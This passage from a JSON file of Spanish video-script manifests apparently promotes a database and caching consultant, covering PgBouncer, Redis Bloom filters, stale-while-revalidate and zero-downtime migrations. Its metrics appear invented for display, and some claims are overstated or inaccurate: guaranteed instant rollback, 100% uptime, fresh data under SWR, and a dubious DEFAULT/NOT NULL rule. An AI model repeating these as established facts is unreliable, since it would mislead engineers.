    "group": "17. CONNECTION POOLING PGBOUNCER",
    "label": "Var B (Polémico): Tu base de datos no está lenta, estás saturando el pool de conexiones",
    "variation": "B (Polémico)",
    "category": "BASES DE DATOS & ESCALABILIDAD",
    "manifest": {
      "title": "[17] Tu base de datos no está lenta, estás saturando el pool de conexiones (Var B)",
      "category": "BASES DE DATOS & ESCALABILIDAD",
      "slug": "17_connection_pooling_pgbouncer",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "pool_collapse_hook",
          "type": "connection_pool_viz",
          "duration": 6,
          "voiceover": "Tu backend en Node o Serverless abre conexiones a lo loco y cuando sube el tráfico tu base de datos se congela. El problema no son tus queries, es la saturación de conexiones.",
          "visual_cue": "Visualizador de PgBouncer absorbiendo la sobrecarga de conexiones",
          "props": {
            "badge": "ERROR COMÚN DE ESCALABILIDAD",
            "title": "SATURACIÓN DE POOL EN SERVERLESS",
            "subtitle": "PGBOUNCER NEUTRALIZANDO PICOS DE TRÁFICO"
          }
        },
        {
          "id": "metrics_pool",
          "type": "metrics_comparison",
          "duration": 5.5,
          "voiceover": "Un servidor de base de datos con cuatro núcleos solo puede ejecutar cuatro queries simultáneamente en CPU. Tener quinientas conexiones abiertas solo causa contención.",
          "visual_cue": "Comparativa de memoria consumida: 10 GB sin pool vs 200 MB con PgBouncer",
          "props": {
            "header": "MEMORIA DESPERDICIADA EN CONEXIONES",
            "metricA": {
              "label": "CONEXIONES DIRECTAS (1.000)",
              "value": "10.2 GB RAM",
              "sub": "Sobrecarga de procesos en el kernel",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "CON PGBOUNCER (20 WORKERS)",
              "value": "240 MB RAM",
              "sub": "Pool transaccional ultra eficiente",
              "color": "#10b981"
            }
          }
        }
      ]
    }
  },
  {
    "key": "18_A",
    "topicNum": "18",
    "group": "18. BLOOM FILTERS PROBABILISTIC",
    "label": "Var A (Técnico): Bloom Filters: Cómo saber si un registro existe con 99% de certeza",
    "variation": "A (Técnico)",
    "category": "ESTRUCTURAS DE DATOS PROBABILÍSTICAS",
    "manifest": {
      "title": "[18] Bloom Filters: Cómo saber si un registro existe con 99% de certeza (Var A)",
      "category": "ESTRUCTURAS DE DATOS PROBABILÍSTICAS",
      "slug": "18_bloom_filters_probabilistic",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "bloom_lead",
          "type": "cache_flow_viz",
          "duration": 6.5,
          "voiceover": "¿Cómo saber si un nombre de usuario ya está registrado entre quinientos millones de registros sin tocar el disco? Usando un filtro de Bloom en memoria.",
          "visual_cue": "Visualizador de array de bits de Bloom Filter iluminando posiciones de hash",
          "props": {
            "mode": "bloom",
            "badge": "ESTRUCTURA PROBABILÍSTICA",
            "title": "FILTRO DE BLOOM EN MEMORIA",
            "subtitle": "3 FUNCIONES HASH ILUMINANDO UN ARRAY DE BITS"
          }
        },
        {
          "id": "redis_code_bloom",
          "type": "code_terminal",
          "duration": 5.5,
          "voiceover": "La clave pasa por tres funciones hash que encienden bits en un vector binario. Si algún bit es cero, sabemos con certeza absoluta que el dato no existe.",
          "visual_cue": "Terminal ejecutando comandos BF.ADD y BF.EXISTS en Redis",
          "props": {
            "header": "COMANDOS DE BLOOM EN REDIS",
            "title": "VERIFICACIÓN EN TIEMPO O(1)",
            "filename": "bloom_check.sh",
            "codeLines": [
              "# Reservar filtro con 0.1% de error:",
              "BF.RESERVE usernames 0.001 10000000",
              "BF.ADD usernames \"edixon_dev\"",
              "",
              "# Comprobación instantánea:",
              "BF.EXISTS usernames \"inexistent_user\" -> 0 (0ms disco)"
            ],
            "cursorLine": 5
          }
        },
        {
          "id": "metrics_bloom",
          "type": "metrics_comparison",
          "duration": 5.5,
          "voiceover": "Evitas el noventa y nueve por ciento de las consultas pesadas a la base de datos ahorrando miles de dólares en servidores. Link en bio para optimizaciones.",
          "visual_cue": "Comparativa de lecturas de disco ahorradas gracias al filtro probabilístico",
          "props": {
            "header": "CONSULTORÍA EN ALGORITMOS (Link en bio)",
            "metricA": {
              "label": "CONSULTAS SQL A DISCO",
              "value": "45.000 / seg",
              "sub": "I/O intensivo saturando el SSD",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "CON FILTRO DE BLOOM",
              "value": "450 / seg",
              "sub": "99% resuelto en nanosegundos en RAM",
              "color": "#10b981"
            }
          }
        }
      ]
    }
  },
  {
    "key": "18_B",
    "topicNum": "18",
    "group": "18. BLOOM FILTERS PROBABILISTIC",
    "label": "Var B (Polémico): Ahorra miles de dólares en queries usando filtros probabilísticos en Redis",
    "variation": "B (Polémico)",
    "category": "ESTRUCTURAS DE DATOS PROBABILÍSTICAS",
    "manifest": {
      "title": "[18] Ahorra miles de dólares en queries usando filtros probabilísticos en Redis (Var B)",
      "category": "ESTRUCTURAS DE DATOS PROBABILÍSTICAS",
      "slug": "18_bloom_filters_probabilistic",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "bloom_shock_b",
          "type": "cache_flow_viz",
          "duration": 6,
          "voiceover": "Tu base de datos pasa la mitad del tiempo buscando registros que ni siquiera existen en el sistema. Un filtro de Bloom detiene esas consultas en memoria.",
          "visual_cue": "Visualizador del veredicto instantáneo de Bloom evitando consultas a disco",
          "props": {
            "mode": "bloom",
            "badge": "ZERO DISK I/O",
            "title": "FILTRO PROBABILÍSTICO EN REDIS",
            "subtitle": "DETIENE CONSULTAS INÚTILES ANTES DE TOCAR POSTGRES"
          }
        },
        {
          "id": "terminal_bloom_b",
          "type": "terminal_split",
          "duration": 5.5,
          "voiceover": "Por solo unos megabytes de memoria proteges tu clúster principal y garantizas respuestas en microsegundos. Link en bio para auditar tu caché.",
          "visual_cue": "Terminal mostrando benchmark de Bloom Filter y llamada a la acción en bio",
          "props": {
            "header": "AUDITORÍA DE INFRAESTRUCTURA (Link en bio)",
            "title": "PROTECCIÓN DE BASE DE DATOS",
            "leftTitle": "BENCHMARK DE CACHÉ",
            "rightTitle": "BENEFICIOS CLAVE",
            "leftText": "$ redis-benchmark -t bf.exists -q\n✔ Throughput: 124.000 ops/sec\n✔ Latencia media: 0.08 ms\n✔ 99.2% de lecturas a disco evitadas",
            "rightText": "• Reduce el tamaño de tu clúster de DB\n• Desaparecen los timeouts en picos\n• Estructura ligera de pocos megabytes\n• ¿Evaluamos tu caso? Enlace en mi perfil"
          }
        }
      ]
    }
  },
  {
    "key": "19_A",
    "topicNum": "19",
    "group": "19. CACHE STALE WHILE REVALIDATE",
    "label": "Var A (Técnico): Anatomía de un Cache Stampede y cómo el encabezado SWR lo neutraliza",
    "variation": "A (Técnico)",
    "category": "SISTEMAS DE CACHÉ & ALTA DISPONIBILIDAD",
    "manifest": {
      "title": "[19] Anatomía de un Cache Stampede y cómo el encabezado SWR lo neutraliza (Var A)",
      "category": "SISTEMAS DE CACHÉ & ALTA DISPONIBILIDAD",
      "slug": "19_cache_stale_while_revalidate",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "swr_flow_lead",
          "type": "cache_flow_viz",
          "duration": 6.5,
          "voiceover": "Cuando la clave de caché de tu producto más vendido expira, diez mil peticiones simultáneas golpean la base de datos al mismo tiempo: eso es un Cache Stampede.",
          "visual_cue": "Visualizador del ciclo de vida SWR y neutralización del Cache Stampede",
          "props": {
            "mode": "swr",
            "badge": "RESILIENCIA EN ALTA ESCALA",
            "title": "CICLO STALE-WHILE-REVALIDATE",
            "subtitle": "RESPUESTAS EN 2 MS MIENTRAS UN WORKER REVALIDA DE FONDO"
          }
        },
        {
          "id": "pipeline_swr",
          "type": "network_pipeline",
          "duration": 5.5,
          "voiceover": "Con el encabezado Stale-While-Revalidate, el primer usuario recibe el dato viejo en dos milisegundos mientras un proceso en segundo plano actualiza el valor sin bloquear a nadie.",
          "visual_cue": "Tubería de red mostrando cómo los clientes reciben datos de caché sin esperar por la base de datos",
          "props": {
            "header": "FLUJO DE PETICIONES HTTP",
            "title": "RESPUESTA INMEDIATA DESDE EL EDGE",
            "latency": "2.1 ms",
            "stages": [
              {
                "name": "Edge Cache Hit",
                "tag": "Stale data servido"
              },
              {
                "name": "Background Lock",
                "tag": "1 sola query a DB"
              },
              {
                "name": "Atomic Cache Swap",
                "tag": "Nuevo valor disponible"
              }
            ]
          }
        },
        {
          "id": "cta_swr",
          "type": "terminal_split",
          "duration": 5.5,
          "voiceover": "Diseño arquitecturas de caché resilientes para evitar caídas en eventos de alto tráfico. Link en mi perfil para auditar tu sistema.",
          "visual_cue": "Terminal mostrando cabeceras HTTP de SWR y llamada a la acción en bio",
          "props": {
            "header": "CONSULTORÍA EN CACHÉ (Link en bio)",
            "title": "ALTA DISPONIBILIDAD GARANTIZADA",
            "leftTitle": "CABECERA HTTP DE RESPUESTA",
            "rightTitle": "IMPACTO EN PRODUCCIÓN",
            "leftText": "HTTP/2 200 OK\ncache-control: max-age=60, stale-while-revalidate=300\nx-cache-status: STALE (Background refreshed)\n✔ Tiempo de respuesta: 1.8 ms",
            "rightText": "• Cero caídas por expiración de caché\n• 100% de peticiones en < 5ms\n• Base de datos protegida ante avalanchas\n• Contacto para auditoría: link en bio"
          }
        }
      ]
    }
  },
  {
    "key": "19_B",
    "topicNum": "19",
    "group": "19. CACHE STALE WHILE REVALIDATE",
    "label": "Var B (Polémico): Cómo servir respuestas en 5 milisegundos sin servir datos desactualizados",
    "variation": "B (Polémico)",
    "category": "SISTEMAS DE CACHÉ & ALTA DISPONIBILIDAD",
    "manifest": {
      "title": "[19] Cómo servir respuestas en 5 milisegundos sin servir datos desactualizados (Var B)",
      "category": "SISTEMAS DE CACHÉ & ALTA DISPONIBILIDAD",
      "slug": "19_cache_stale_while_revalidate",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "swr_shock_b",
          "type": "cache_flow_viz",
          "duration": 6,
          "voiceover": "Creer que una caché rápida siempre devuelve datos viejos es un error. Con la técnica adecuada entregas contenido en dos milisegundos y mantienes los datos frescos.",
          "visual_cue": "Visualizador del reemplazo atómico de datos en caché",
          "props": {
            "mode": "swr",
            "badge": "LATENCIA HUMANA CERO",
            "title": "FRESCURA ATÓMICA EN MEMORIA",
            "subtitle": "SERVIDO DESDE EDGE/RAM SIN BLOQUEOS"
          }
        },
        {
          "id": "terminal_swr_b",
          "type": "terminal_split",
          "duration": 5.5,
          "voiceover": "Aprovecha las capacidades nativas de HTTP y CDNs modernas sin meter capas complejas de software. Link en mi perfil para asesoría técnica.",
          "visual_cue": "Terminal comparando latencia con SWR y llamada a la acción en bio",
          "props": {
            "header": "OPTIMIZACIÓN WEB (Link en bio)",
            "title": "RESPUESTAS ULTRARRÁPIDAS",
            "leftTitle": "CONSULTA TRADICIONAL",
            "rightTitle": "ARQUITECTURA SWR",
            "leftText": "Latencia: 340 ms (Consulta a disco)\nCPU del servidor: 78%\nBloqueo ante expiración de clave",
            "rightText": "Latencia: 2.1 ms (Edge Cache)\nCPU del servidor: 2%\nRevalidación atómica sin interrupción"
          }
        }
      ]
    }
  },
  {
    "key": "20_A",
    "topicNum": "20",
    "group": "20. MIGRACIONES ZERO DOWNTIME",
    "label": "Var A (Técnico): El Patrón Expand & Contract: Modificar esquemas masivos con 0s downtime",
    "variation": "A (Técnico)",
    "category": "BASES DE DATOS & OPERACIONES EN VIVO",
    "manifest": {
      "title": "[20] El Patrón Expand & Contract: Modificar esquemas masivos con 0s downtime (Var A)",
      "category": "BASES DE DATOS & OPERACIONES EN VIVO",
      "slug": "20_migraciones_zero_downtime",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "stepper_expand_contract",
          "type": "migration_stepper_viz",
          "duration": 6.5,
          "voiceover": "Modificar una columna en una tabla con cincuenta millones de filas puede bloquear toda tu aplicación. El patrón Expand and Contract elimina el riesgo por completo.",
          "visual_cue": "Visualizador del patrón Expand & Contract con 4 fases progresivas en la tabla users",
          "props": {
            "badge": "PATRÓN ARQUITECTÓNICO",
            "title": "EXPAND & CONTRACT",
            "subtitle": "MIGRACIONES EN 4 FASES SIN BLOQUEO DE TABLA"
          }
        },
        {
          "id": "sql_safe_code",
          "type": "code_terminal",
          "duration": 5.5,
          "voiceover": "Primero expandes agregando la nueva columna como nullable. Luego tu aplicación escribe en ambas columnas simultáneamente mientras un worker migra el histórico.",
          "visual_cue": "Terminal mostrando las sentencias SQL seguras y el dual-write en código",
          "props": {
            "header": "SQL SEGURO EN PRODUCCIÓN",
            "title": "MIGRACIÓN SIN BLOQUEOS EXCLUSIVOS",
            "filename": "migrations/004_split_names.sql",
            "codeLines": [
              "-- 1. EXPAND: Nueva columna nullable sin lock exclusivo",
              "ALTER TABLE users ADD COLUMN first_name VARCHAR(128);",
              "",
              "-- 2. DUAL WRITE en la aplicación:",
              "-- users.save({ full_name, first_name, last_name });"
            ],
            "cursorLine": 4
          }
        },
        {
          "id": "cta_migrations",
          "type": "tradeoff_matrix",
          "duration": 5.5,
          "voiceover": "Finalmente contraes eliminando la columna antigua. Cero segundos de caída y rollback instantáneo garantizado. Link en bio para planificar migraciones críticas.",
          "visual_cue": "Matriz comparativa entre ALTER TABLE directo vs Expand & Contract y llamada a la acción en bio",
          "props": {
            "header": "CONSULTORÍA EN BASES DE DATOS (Link en bio)",
            "title": "MIGRACIONES SEGURAS EN PRODUCCIÓN",
            "colA": "EXPAND & CONTRACT",
            "colB": "ALTER TABLE DIRECTO",
            "rows": [
              {
                "dim": "Bloqueo exclusivo de tabla",
                "a": "0 segundos (Sin locks)",
                "b": "Minutos u horas de bloqueo",
                "aGood": true
              },
              {
                "dim": "Capacidad de Rollback",
                "a": "Instantáneo sin drama",
                "b": "Destructivo y arriesgado",
                "aGood": true
              },
              {
                "dim": "Disponibilidad de servicio",
                "a": "100% de uptime en vivo",
                "b": "Caída de servicio garantizada",
                "aGood": true
              }
            ]
          }
        }
      ]
    }
  },
  {
    "key": "20_B",
    "topicNum": "20",
    "group": "20. MIGRACIONES ZERO DOWNTIME",
    "label": "Var B (Polémico): Nunca hagas ALTER TABLE a ciegas: Cómo evitar bloqueos de tabla",
    "variation": "B (Polémico)",
    "category": "BASES DE DATOS & OPERACIONES EN VIVO",
    "manifest": {
      "title": "[20] Nunca hagas ALTER TABLE a ciegas: Cómo evitar bloqueos de tabla (Var B)",
      "category": "BASES DE DATOS & OPERACIONES EN VIVO",
      "slug": "20_migraciones_zero_downtime",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "stepper_disaster_avoid",
          "type": "migration_stepper_viz",
          "duration": 6,
          "voiceover": "Un simple ALTER TABLE adquiere un bloqueo exclusivo en PostgreSQL que encola todas las lecturas y escrituras, tirando tus servidores en segundos.",
          "visual_cue": "Visualizador de prevención de bloqueos mediante fases progresivas",
          "props": {
            "badge": "ERROR FATAL EN PRODUCCIÓN",
            "title": "EVITANDO BLOQUEOS EXCLUSIVOS",
            "subtitle": "ALTER TABLE A CIEGAS = CAÍDA TOTAL DEL SERVICIO"
          }
        },
        {
          "id": "terminal_lock_monitor",
          "type": "terminal_split",
          "duration": 5.5,
          "voiceover": "Usa herramientas de migración con algoritmos de tiempo compartido y divide los cambios en fases atómicas. Link en mi perfil para auditar tus esquemas.",
          "visual_cue": "Terminal monitoreando bloqueos en pg_stat_activity y llamada a la acción en bio",
          "props": {
            "header": "AUDITORÍA DE BASE DE DATOS (Link en bio)",
            "title": "MONITOREO DE LOCKS EN TIEMPO REAL",
            "leftTitle": "PG_STAT_ACTIVITY",
            "rightTitle": "BUENAS PRÁCTICAS",
            "leftText": "$ psql -c \"SELECT pid, locktype, mode, granted FROM pg_locks;\"\n✔ AccessExclusiveLock evitado con éxito\n✔ Cola de peticiones: 0 bloqueadas\n✔ 100% de transacciones fluidas",
            "rightText": "• Nunca agregues columnas con DEFAULT sin NOT NULL\n• Usa CREATE INDEX CONCURRENTLY\n• Migra datos históricos en lotes controlados\n• Asesoría técnica: enlace en mi bio"
          }
        }
      ]
    }
  }
];
